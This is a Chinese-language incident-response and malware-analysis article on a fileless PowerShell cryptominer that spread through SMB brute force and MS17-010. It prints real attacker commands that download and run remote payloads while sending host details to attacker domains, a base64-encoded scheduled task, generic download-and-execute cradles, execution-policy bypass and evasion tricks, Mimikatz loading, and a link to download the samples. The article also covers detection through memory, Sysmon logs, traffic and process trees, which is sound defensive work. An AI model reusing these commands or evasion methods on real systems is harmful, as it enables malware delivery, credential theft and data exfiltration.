## 一、概述

### 1.1 概述

前段时间遇到一起案例，主要是通过powershell进行挖矿的，使用该技术来进行挖矿的案例非常之多，但是个人感觉还是可以总结与分析一波，可以对这种技术进行详细分析以后讨论一下如何进行有效的监测与防护。

### 1.2 个人思路

通过最近遇到的几起应急事件，越来越感觉恶意样本分析在应急响应的过程中会越来越重要，特别是恶意样本的逆向分析，所以搞应急的兄弟们需要多注重样本分析这块。同时，样本解密这一块也需要做些了解，目前发现很多恶意样本都会进行加密来躲避杀软以及安全研究人员的分析。

另外，无文件攻击会综合使用系统的白名单功能，如powershell、PSExec，以及各种变形、加密、混淆、恶意文件放在远程服务器上，通过下载到内存中执行等方式来执行，导致其在防护这块还是存在很多技术难度。但是其在发生事件后的监测还是有很多方式的，如流量、日志、内存等方式来监测。通过无文件攻击这一块，本文会在事后监测这块做一些分享。

## 二、 应急响应案例

### 2.1 分析结论

> 1、此次攻击主要利用SMB匿名登录以及口令爆破利用病毒投放；
>
> 2、目前只捕捉到基于TCP
> 445的病毒投放动作，但是分析其攻击文件，里面还会有针对1433、3389以及65529的扫描行为，后续可能会利用相关端口进行横向渗透以及病毒投放行为；
>
>
> 3、挖矿病毒通过powershell驻留在内存中，通过CPU进行挖矿，会导致CPU占用100%。同时挖矿病毒在本地无落地文件，因此需要dump内存才能分析相关行为；
>
> 4、同时还会利用定时任务定时下载恶意文件来进行攻击行为；
>
> 5、内网大量机器开放445端口并且未打补丁，建议后期批量封堵445以及打补丁；
>
> 6、通过现有的日志，发现最早的攻击时间为2019年9月10日23:48分。

### 2.2 过程分析

2.2.1 现象确认

某用户，通过前线技术反馈可能存在powershell挖矿行为，通过前线技术兄弟协助，找到其中一台存在异常的服务器(192.168.0.8)进行分析,发现其CPU利用率为100%。

![](https://image.3001.net/images/20191015/1571141910_5da5b91602f4c.jpg!small)

对CPU利用率进行排名，发现占用CPU比较高的都为powershell。

![](https://image.3001.net/images/20191015/1571141924_5da5b924117cd.jpg!small)

2.2.2Powershell分析

分析powershell这一块，可以使用processhacker、processmonitor、processexplorer、火绒剑等来分析，火绒剑界面相对友好，各种功能也很强大，缺点就是需要安装，并且经常很卡，个人喜欢使用ProcessHacker这个功能。

![](https://image.3001.net/images/20191015/1571141938_5da5b9326b984.jpg!small)

利用ProcessHacker分析Powershell的命令参数，相关的参数如下:

    
    
    "C:\Windows\system32\cmd.exe"/c powershell -nop -w hidden -ep bypass -c"$ifp=$env:tmp+'\if.bin';if(test-path$ifp){$con=[System.IO.File]::ReadAllBytes($ifp);[System.Security.Cryptography.MD5]::Create().ComputeHash($con)|foreach{$s+=$_.ToString('X2')};if($s-ne'abcc20b2de0b18c895b94d2c23c0bc63'){$con=''}}if(!$con){$con=(New-ObjectNet.WebClient).downloaddata('[http://down.ackng.com/if.bin?ID=WIN-707K0JETN3J&GUID=4](http://down.ackng.com/if.bin?ID=WIN-707K0JETN3J&GUID=4)****544-0046-3710-8037-B7C04F344E32&MAC=D0:94:66:30:8B:7D&OS=6.3.9600&BIT=64位&USER=WIN-707K0JETN3J$&DOMAIN=WORKGROUP&D=&CD=MatroxG200eR (Renesas) WDDM1.2&P=1&FI=0&FM=1&IF=1&MF=1&HR=39.67,41.44,41.89&UP=405600.656&_T=1568219962.54539');[System.IO.File]::WriteAllBytes($ifp,$con)}IEX(-join[char[]]$con)"

对上面的powershell参数与命令进行分析，相关参数含义如下:

> -nop 不加载配置文件
>
> -w hidden 隐藏执行命令窗口
>
> -ep bypass 忽略执行策略文件
>
> -c powershell 命令

主要的功能如下:

> 1.校验本地TMP目录下是否存在if.bin的文件,
>
> 2.并校验其MD5是否为abcc20b2de0b18c895b94d2c23c0bc63
>
>
> 3.若if.bin这个文件不存在，则从<http://down.ackng.com/if.bin>下载相应的文件，同时上传上传本机的相关信息(GUID、MAC地址、操作系统位数、机器名、工作组等信息)

对if.bin进行分析，发现其是powershell木马以及反弹后门。

2.2.3 If.bin样本分析

前面分析，可以了解到powershell的主要目的是为了下载if.bin这个文件,所以我们对if.bin进行分析，直接下载下来，分析相关文件进行了加密。

![](https://image.3001.net/images/20191015/1571141956_5da5b9440acf4.jpg!small)

分析做加密方式，主要是通过base64和DeflateStream两种方式，需要对样本进行解密，相关解密方式可使用CyberChef来进行解密，使用方法可参考

<https://www.freebuf.com/sectool/209290.html>

对其进行解密还原，还原后的部分核心内容如下所示:

2.2.3.1 端口转发

开放65529端口，并将其转发到1.1.1.1的53端口，同时创建一个定时任务，每10分钟运行一次(个人猜测这个功能是攻击者从网上抄的，目前其实并未起到效果)

2.2.3.2 定时任务

创建定时任务，每60分钟运行一次，主要功能为通过[http://t.zer2.com](http://t.zer2.com/)下载恶意文件，放到powershell中运行，同时还会上传本机信息(MAC、GUID、user,domain等)

![](https://image.3001.net/images/20191015/1571141971_5da5b9530bc3d.jpg!small)

2.2.3.3 SMB爆破

![](https://image.3001.net/images/20191015/1571141982_5da5b95eaa346.jpg!small)

![](https://image.3001.net/images/20191015/1571141983_5da5b95f933b5.jpg!small)

2.2.3.4 shellcode

![](https://image.3001.net/images/20191015/1571142004_5da5b974bf6ca.jpg!small)

![](https://image.3001.net/images/20191015/1571142005_5da5b9753788b.jpg!small)

2.2.3.5 MS17-010漏洞传播

![](https://image.3001.net/images/20191015/1571142025_5da5b98934235.jpg!small)

2.2.3.6 获取系统信息

获取用户信息、DumpHash、获取UserHashes、获取启动项目等

![](https://image.3001.net/images/20191015/1571142036_5da5b9941a397.jpg!small)

2.2.3.7 端口扫描

![](https://image.3001.net/images/20191015/1571142136_5da5b9f84256b.jpg!small)

可以看出，对恶意样本的分析还需要对样本进行代码级别的分析，这样可以还原样本的所有功能，如果我们通过网络流量、日志等其他方式来进行分析的话，一方面可能因为样本的执行需要满足一定条件才会触发，另一方面样本的功能我们通过日志和流量只能采集到部分功能。

2.2.4 内存分析

我们知道,powershell相关的行为都是驻留在内存中，在本地无落地文件，因此我们直接使用ProcessHacker来dump了Powershell的内存数据进行分析。

![](https://image.3001.net/images/20191015/1571142163_5da5ba1316c41.jpg!small)

使用Notepad++打开内存数据，过滤其中内容，可以看到其正在执行上述powershell命令:

![](https://image.3001.net/images/20191015/1571142173_5da5ba1dc3242.jpg!small)

内存里主要从[http://down.ackng.com/if.bin下载bin](http://down.ackng.com/if.bin%E4%B8%8B%E8%BD%BDbin)文件，相应的文件主要功能参考2.2.3的分析。

2.2.5 定时任务分析

一般情况下，powershell利用定时任务来进行传播，因此对定时任务分析，对192.168.0.8的定时任务分析，其定时任务如下:

![](https://image.3001.net/images/20191015/1571142187_5da5ba2b6ad7b.jpg!small)

可以看到该定时任务开始时间为2019年9月10日20:35分，这个时间也就是挖矿病毒感染那段时间前后，同时该定时任务每1小时执行一次。

![](https://image.3001.net/images/20191015/1571142204_5da5ba3cc0ddb.jpg!small)

同时，定时任务主要是执行powershell,其执行的命令如下:

    
    
    cmd /c "setA=power& call %A%shell -ep bypass -eJABMAGUAbQBvAG4AXwBEAHUAYwBrAD0AJwBEAFoAWABIAFEAegBxAGoAJwA7ACQAeQA9ACcAaAB0AHQAcAA6AC8ALwB0A**AegBlAHIAMgAuAGMAbwBtAC8AdgAuAGoAcwAnADsAJAB6AD0AJAB5ACsAJwBwACcAKwAnAD8AaQBwAGMAXwAyADAAMQA5ADAAOQAxADAAJwA7ACQAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtA**ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApA**ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHkAKQA7AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAE0ARAA1AF0AOgA6AEMAcgBlAGEAdABlACgAKQAuAEMAbwBtAHAAdQB0AGUASABhAHMAaAAoACQAbQApAHwAZgBvAHIAZQBhAGMAaAB7ACQAcwArAD0AJABfA****ABvAFMAdAByAGkAbgBnACgAJwB4ADIAJwApAH0AOwBpAGYAKAAkAHMALQBlAHEAJwBkADgAMQAwADkAYwBlAGMAMABhADUAMQA3ADEAOQBiAGUANgBmADQAMQAxAGYANgA3AGIAMwBiADcAZQBjADEAJwApAHsASQBFAFgAKAAtAGoAbwBpAG4AWwBjAGgAYQByAFsAXQBdACQAbQApAH0A"

直接解密定时任务的内容，解密后为：

IEX(New-ObjectSystem.Net.WebClient).DownloadString('<http://t.zer2.com/v.jsp?msolow>')

2.2.6 网络连接分析

发现对对内网445端口以及65529端口的扫描行为

![](https://image.3001.net/images/20191015/1571142264_5da5ba787e0bd.jpg!small)

![](https://image.3001.net/images/20191015/1571142264_5da5ba788bb64.jpg!small)

相关行为在if.bin文件中可以看到相关的代码,不仅会扫描445，65529，还会扫描1433和3389，只是在192.168.0.8这台机器上未捕捉到扫描3389和1433的行为。

![](https://image.3001.net/images/20191015/1571142296_5da5ba9885d1a.jpg!small)

2.2.7 日志分析

通过对日志分析，发现网络中存在大量的基于SMB的爆破行为，相关日志如下:

![](https://image.3001.net/images/20191015/1571142311_5da5baa7ba60c.jpg!small)

通过目前现有的已经记录的日志，最早可以追溯到2019年9月10日23:48:48就存在相应的SMB爆破行为，相关的攻击IP为192.168.0.28

![](https://image.3001.net/images/20191015/1571142324_5da5bab463af8.jpg!small)

爆破成功日志

![](https://image.3001.net/images/20191015/1571142334_5da5babeab557.jpg!small)

![](https://image.3001.net/images/20191015/1571142369_5da5bae1b4df1.jpg!small)

2.2.8开放端口

内网大量机器开放TCP 445,导致该病毒可以快速传播。

![](https://image.3001.net/images/20191015/1571142391_5da5baf7232e7.jpg!small)

2.2.9补丁分析

由于该病毒会利用永恒之蓝(MS17-010)进行传播，分析192.168.0.8，发现其未打相关补丁。

![](https://image.3001.net/images/20191015/1571142405_5da5bb0585fb7.jpg!small)

## 三、攻击方式

### 3.1 感染途径

3.1.1 邮件

电子邮件是powershell 下载者最常见的传播手段，垃圾邮件中经常在.zip包中，包含powershell 脚本文件，这些文件有以下扩展:

.lnk .wsf.hta .mhtml .html.doc .docm .xls

.xlsm .ppt.pptm .chm .vbs .js.bat .pif .pdf.jar

3.1.2 Office宏文档

powershell.exe–nop –w hidden –c

“IEX((NEW-object
net.webclient).downloadstring(‘[http://192.168.0.42:80/a](http://192.168.0.42/a)’))”

3.1.3 各种EXP

包括各种RCE、web漏洞、系统漏洞(MS17-010等)，攻击者比较喜欢的方式，特别是可以工具化、自动化利用的EXP

### 3.2 免杀对抗

3.2.1 隐藏执行窗口

–WindowStyle hidden / -whidden：对用户隐藏PowerShell程序窗口，以隐藏操作痕迹

3.2.2 管道

最常见的bypass执行策略，通过管道方式将脚本内容插入到powershell.exe的标准输入内，这种方法不会改变配置但要求写入磁盘：

    
    
    `Typehelloword.ps1 |powershell.exe -NoP

> -noprofile，简写-NoP， 为不加载windowspoweshell配置文件

你也可以从网络上下载脚本并执行，这样就不会写入磁盘和修改配置文件

    
    
    powershell -nop-c "iex(New-Object Net.WebClient).DowndloadString('url')"

> iex Invoke-Expression，允许用户计算和运行动态生成的命令，输出命令的执行结果

> (New-ObjectNet.WebClient).DownloadString，最为常见的远程下载方法，Invoke-> WebRequest,BitsTransfer,Net.Sockets.TCPClient都能执行类似的功能

3.2.3 Exec bypass

使用powershell策略中的bypass策略，这种方法不会改变配置或者要求写入磁盘，并且不会有任何的警告或提示，如果你使用Unrestricted，在运行网上下载的未被签名的脚本时会有警告

powershell.exe-ExecutionPolicy bypass -File helloworld.ps1

> -exec bypass 忽略执行策略文件

> -File 指定文件

3.2.4 编码与加密

使用加密方式绕过，首先需要将命令stream加密，再base64加密即可，命令如下:

![](https://image.3001.net/images/20191015/1571142420_5da5bb14a469e.jpg!small)

3.2.5 指定版本参数不记录参数

指定版本参数，使得攻击者可以降低powershell到一个旧版本，新版本如-version 2.0可以记录操作

3.2.6 PSConsole

使用PSConsole指定powershell控制文件

3.2.7 样本案例

Cmd /c powershell-w hidden -ep bypass -c while($True){try{IEX (New-ObjectNet.WebClient).downloadstring('<a
href="<http://t.zer2.com/ipc.jsp?l>"><http://t.zer2.com/ipc.jsp?l></a>')}catch{Sleep
-m2500000}}

Cmd /c 使用cmd加载powershell

-nop 不加载配置文件

-w hidden 隐藏执行窗口

-c 执行命令

### 3.3 Powershell在攻击活动中的应用

3.3.1 挖矿

powershell"if(!(string).contains('SCM EventFilter'))

{IEX(NewObjectNet.WebClient).DownloadString('<a
href="<http://xxxxxxxx:8000/info6.ps1>"><http://XXXXXXXX:8000/info6.ps1></a>')}"

3.3.2 勒索

Powershell.exe–windowstyle hidden

(New-ObjectSystem.Net.WebClient.DownloadFile

(‘http://[REMOVED]’,’%Temp%\\[RANDOM].exe’);Start-Process‘%Temp%\\[RANDOM].exe’

3.3.3 横向渗透

常用的横向移动方法如下：

Invoke-Command

Enter-PSSession

WMI/wmic/Invoke-WMImethod

Profile injection

Task Sheduler

Common tools e.g. PsExec

Invoke-Command

Invoke-Shellcode，支持msf部分功能

脚本下载地址:

<https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/12ce71b9f4b0428d9425e001e5988f91eb2b8b87/CodeExecution/Invoke
--Shellcode.ps1>

Invoke-PortScan,端口扫描

脚本下载:

<https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1>

 **Invoke-ReflectivePEInjection，开启代理**

脚本下载:

<https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1>

3.3.4 其他

如提取密码，

IEX(New-ObjectNet.WebClient).DownloadString('<http://192.168.1.108/Invoke-Mimikatz.ps1>');

Invoke-Mimikatz

## 四、如何发现

由于无文件挖矿本身没有文件落地，因此常规基于文件的杀软很难有效进行查杀，目前比较主要的发现机制个人总结如下:

### 4.1 内存

由于无文件攻击主要在内存中执行，因此可以通过分析内存的方法来分析相应的攻击行为，这样的话需要周期性的将内存dump出来，对于某个进程可以使用ProcessHacker来dump，对于整台服务器的内存可以使用RamCapturer来dump内存，同时使用Volatility分析。Linux可以使用dump命令直接将内存导出:

![](https://image.3001.net/images/20191015/1571142442_5da5bb2a9ec83.jpg!small)

![](https://image.3001.net/images/20191015/1571142442_5da5bb2ad1e6f.jpg!small)

![](https://image.3001.net/images/20191015/1571142443_5da5bb2b0318a.jpg!small)

### 4.2 日志

正常情况下powershell执行的命令通过系统层面的日志是无法直接记录的，但是微软的工具sysmon可以记录到powershell的攻击行为,关于sysmon的相关功能和使用大家可以网上找找，sysmon相关事件id的主要功能如下:

**序号** | **ID** | **Tag**  
---|---|---  
1 | ProcessCreate | Process Create  
2 | FileCreateTime | File creation time  
3 | NetworkConnect | Network connection detected  
4 | n/a | Sysmon service state change (cannot be filtered)  
5 | ProcessTerminate | Process terminated  
6 | DriverLoad | Driver Loaded  
7 | ImageLoad | Image loaded  
8 | CreateRemoteThread | CreateRemoteThread detected  
9 | RawAccessRead | RawAccessRead detected  
10 | ProcessAccess | Process accessed  
11 | FileCreate | File created  
12 | RegistryEvent | Registry object added or deleted  
13 | RegistryEvent | Registry value set  
14 | RegistryEvent | Registry object renamed  
15 | FileCreateStreamHash | File stream created  
16 | n/a | Sysmon configuration change (cannot be filtered)  
17 | PipeEvent | Named pipe created  
18 | PipeEvent | Named pipe connected  
19 | WmiEvent | WMI filter  
20 | WmiEvent | WMI consumer  
21 | WmiEvent | WMI consumer filter  
22 | DNSQuery | DNS query  
  
可以通过事件ID 1来分析相关的命令执行情况，id 1表示进程创建行为，各种进程创建、命令执行都会通过事件id来记录，因此我们可以通过事件id
1来记录相关的powershell命令执行的行为，然后通过Image过滤powershell.exe相关的操作行为，这样的话可以记录到powershell命令执行日志，然后对所有的powershell命令进行分析，正常情况下，很少遇到通过powershell进行运维或相关操作的情况，因此一旦有powershell的相关行为都可以进行分析；如果具体环境里有使用Powershell的情况，这个时候就需要对powershell的命令内容进行过滤与分析了，分析的重点在于相关的命令参数、url等。

下图是使用cmd执行powershell命令，通过sysmon监控到相关的日志情况

![](https://image.3001.net/images/20191015/1571142467_5da5bb43e16b0.jpg!small)

![](https://image.3001.net/images/20191015/1571142468_5da5bb440acf9.jpg!small)

### 4.3 流量

由于无文件在本地无落地文件，因此本地杀软很难有效查杀，但是即使在内存里面执行，其都会产生相应的网络流量，因此可以在流量层面弥补杀软的不足，通过流量层面过滤相应的URL、IP、MD5等进行安全分析。这一块在实际工作中有很多落地的场景，本块就不细讲。

### 4.4 Powershell命令参数

可以对powershell的命令进行监控来分析其是否为可疑，正常情况下，运行powershell一般不会加一些参数，攻击者为了防止被发现，所以会加上相关的参数来对抗杀软以及研究人员，相关可疑的命令参数如下所示:

> NoProfile –nop 不加载配置文件
>
> iex $env:randomname
>
> DownloadFile下载文件到本地
>
> Downloadstring 下载文件到内存
>
> -w hidden 隐藏执行命令窗口
>
> -ep bypass 忽略执行策略文件
>
> Unrestricted

### 4.5 进程调用

正常情况下是powershell的父进程是explorer

![](https://image.3001.net/images/20191015/1571142483_5da5bb53e6d32.jpg!small)

在实际的攻击过程中经常发现其父进程为cmd.exe，其祖父进程为explorer.exe

![](https://image.3001.net/images/20191015/1571142498_5da5bb6245b02.jpg!small)

同时，在某些场景下，管理人员也会使用cmd调用powershell，这个时候我们需要分析调用powershell的祖父进程，若其祖父进程为winword.exe、winword.exe或者wuapp.exe，这种情况表明，某个脚本启动了cmd.exe，这个时候我们需要深入分析一些哪些具体哪个脚本或模板调用的cmd进程。

## 五、样本下载

> 链接:<https://pan.baidu.com/s/1Gfzuia4T0GcRFF_Pb4y7Tw>
>
> 提取码: hfmx

## 六、参考链接

> <https://www.freebuf.com/articles/system/129228.html>
>
> <https://www.freebuf.com/sectool/209290.html>
>
> <https://www.freebuf.com/column/200241.html>
>
> <https://www.freebuf.com/column/203131.html>
>
> <https://www.freebuf.com/sectool/136328.html>

***本文作者：feiniao，转载请注明来自FreeBuf.COM**

